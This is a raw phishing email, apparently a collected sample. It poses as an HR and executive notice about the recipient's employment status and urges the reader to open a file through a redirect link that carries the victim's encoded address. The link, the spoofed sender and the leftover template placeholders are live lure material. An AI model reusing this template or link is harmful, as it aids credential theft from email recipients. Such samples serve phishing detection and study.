@@ -1,0 +1,127 @@
+Return-Path: president@zetaw-eb.com
+Delivered-To: jose@monkey.org
+X-FDA: 81947689026.19.DF1B6A9
+Received: from zetaw-eb.com (unknown [136.243.112.212])
+	by imf29.b.hostedemail.com (Postfix) with ESMTP id 1A28E120007
+	for <jose@monkey.org>; Thu, 28 Mar 2024 21:09:31 +0000 (UTC)
+Authentication-Results: imf29.b.hostedemail.com;	dkim=pass
+ header.d=zetaw-eb.com header.s=default header.b=foiaM56Z;	spf=pass
+ (imf29.b.hostedemail.com: domain of president@zetaw-eb.com designates
+ 136.243.112.212 as permitted sender) smtp.mailfrom=president@zetaw-eb.com;
+	dmarc=pass (policy=reject) header.from=zetaw-eb.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1711660172;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=sE93EB7VG70Nmf9uXx2xtFsEm4FDPw+VlpVmPTJPtDE=;
+	b=D9Wtd1BBZGtKcKhbz5mgKCXsaM0CpC9s/I9uE84mtI9wneVRsU4YAs8DrbSEUfpLCAxncg
+	vGTyprucWpMOQNG/l4rHzVHjsHQn4ZnAdVt+UcvpneJQPaalZHF8EYFQw+B8ToA64ypz81
+	x4k2H70WNfC5eevVF/6nXD68GPzh3+s=
+ARC-Authentication-Results: i=1;	imf29.b.hostedemail.com;	dkim=pass
+ header.d=zetaw-eb.com header.s=default header.b=foiaM56Z;	spf=pass
+ (imf29.b.hostedemail.com: domain of president@zetaw-eb.com designates
+ 136.243.112.212 as permitted sender) smtp.mailfrom=president@zetaw-eb.com;
+	dmarc=pass (policy=reject) header.from=zetaw-eb.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1711660172; a=rsa-sha256;
+	cv=none;
+	b=lstNc/nx7dckJYNQ1eINplxCjz6Cx2mOWLyRKm3lVe6YgfsxKY+Z2D3GibSHlmIO+jv5My
+	72DAb5zWBARpZ3VUUhvti2B2zfJ5/Ni22UR9d1P/iu+uSGHxjkAETKa/vs9WbIdWJHS/u+
+	vSZoym2eXZCFdRHjwBAoFL3AP4TrUBA=
+Received: from EC2AMAZ-SLC4UQG
+ (ec2-18-169-237-242.eu-west-2.compute.amazonaws.com [18.169.237.242])	by
+ zetaw-eb.com (Postfix) with ESMTPSA id D7E38DE917	for <jose@monkey.org>; Thu,
+ 28 Mar 2024 19:26:50 +0000 (GMT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=zetaw-eb.com;
+	s=default; t=1711654010;
+	bh=sE93EB7VG70Nmf9uXx2xtFsEm4FDPw+VlpVmPTJPtDE=; h=From:Subject:To;
+	b=foiaM56ZWzBqJn40ElIW5kfx2MRCrBuI7dh6qOG5x2/VSTINS+QG3hDDJij1hXrMS
+	 WfuZ4Bul5d1iuFhAwyD1w4FB20O6j+wBhUgK4kNLgO4MQnkI/mrm+zHwIO6jo63pl2
+	 j3qMdsgVm+I6Z4/9SH1k0+VkXbWbBhU1T5b1417avgudIULy5aR2MFcVLCPNz5wNyk
+	 CBeQMAJsZWK4TlD4Exe+LgayEq6MLYXAaY+191ezlRZ+4VE6aK2nrtt16lxtl9m1hk
+	 PpWvRFcfneCGIX+xLffiXVBp7YVPxi3hLveAS/mi+pCeHJXeWq2UAlaTPLZ07yz31v
+	 JKbY/nmJZ++Rw==
+Received-SPF: pass (zetaw-eb.com: connection is authenticated)
+From: "HR/Executive" <president@zetaw-eb.com>
+Subject: ..Monkey HR/ Executive: Shared March Meeting Report
+To: <jose@monkey.org>
+Content-Type: multipart/alternative;
+ boundary="2Tnz=_O3CoEjm1dZUsVbaS5aKztcXzYbkj"
+MIME-Version: 1.0
+Date: Thu, 28 Mar 2024 19:26:50 +0000
+Message-Id: <20242803192650F97E4E0BC8-D419266D6E@zetaw-eb.com>
+X-Rspamd-Server: rspam04
+X-Rspamd-Queue-Id: 1A28E120007
+X-Stat-Signature: okc8pkcaymhqhi1qz7tw5k1phpqpuei9
+X-Spam-Status: No, score=1.82
+X-Rspam-User: 
+X-HE-Tag: 1711660171-110971
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+9FVG4vbrFIO5mHrap8RjgPPli2vDOR7D+UqJTyuKVk7v?=
+ =?utf-8?q?3qCSlIDnVw+C7AgOBy24DcMIel+lI2HB7kxa/OH+7XwEvvpXE9Q49ywY0c3tKSE6W?=
+ =?utf-8?q?PlXeAGwTKWQ9JOmZsoaQrjEU8L5M1sKILQdkI7yuJ0MTQuxuLsEZYCcXfdWkmDFyU?=
+ =?utf-8?q?/csAmOzc5OuzMIrMY8AQCK65ArBMeqKDciLN+aBEqTOqTPv8E0=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 87
+
+This is a multi-part message in MIME format
+
+--2Tnz=_O3CoEjm1dZUsVbaS5aKztcXzYbkj
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+
+Hello Jose,
+
+This is the march meeting decision of
+sf_ucfirst(sf_substring(monkey.org, 1, sf_pos(monkey.org, . ,
+1))) HR and Executives on your employment statues
+
+Receiver: Jose
+
+Purpose: **Whitheld**
+
+Approved: sf_ucfirst(sf_substring(monkey.org, 1,
+6)) CEO
+
+Date: Thursday, March 28, 2024
+
+Time: 7:26:50 PM
+
+Open/View Your
+File Here https://clt1671212.benchurl.com/c/l?u=3D10E676D4&e=3D17D42CC=
+&c=3D19802C&t=3D1&l=3DF272E74C&email=3DXM0emHhxQLnazscIL6eupdzyuMA46pA=
+kKRpMklhCcEnFp9Hs0J3nggSXAE%2FMRK6o&seq=3D1#am9zZUBtb25rZXkub3Jn
+
+=C2=A0
+
+This message was created automatically by
+sf_ucfirst(sf_substring(monkey.org, 1, sf_pos(monkey.org, . ,
+1))) mail delivery software.
+
+Do not reply to this automated message.
+
+--2Tnz=_O3CoEjm1dZUsVbaS5aKztcXzYbkj
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+
+ <head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-=
+8">
+ <meta http-equiv=3D"Content-Language" content=3D"en-us"> </head>
+ <p>Hello Jose,</p><p>This is the march meeting decision of Monkey HR =
+and Executives on your employment statues<br> Receiver: Jose<br> Purpo=
+se: **Whitheld**<br> Approved: Monkey CEO<br> Date: Thursday, March 28=
+, 2024 <br> Time: 7:26:50 PM</p><p><b><font size=3D"4"> <a href=3D"htt=
+ps://clt1671212.benchurl.com/c/l?u=3D10E676D4&e=3D17D42CC&c=3D19802C&t=
+=3D1&l=3DF272E74C&email=3DXM0emHhxQLnazscIL6eupdzyuMA46pAkKRpMklhCcEnF=
+p9Hs0J3nggSXAE%2FMRK6o&seq=3D1#am9zZUBtb25rZXkub3Jn">Open/View Your Fi=
+le Here</a></font></b></p><p>&nbsp;</p><p><font size=3D"2">This messag=
+e was created automatically by Monkey mail delivery software.<br> Do n=
+ot reply to this automated message.</font></p>
+
+--2Tnz=_O3CoEjm1dZUsVbaS5aKztcXzYbkj--
+
+
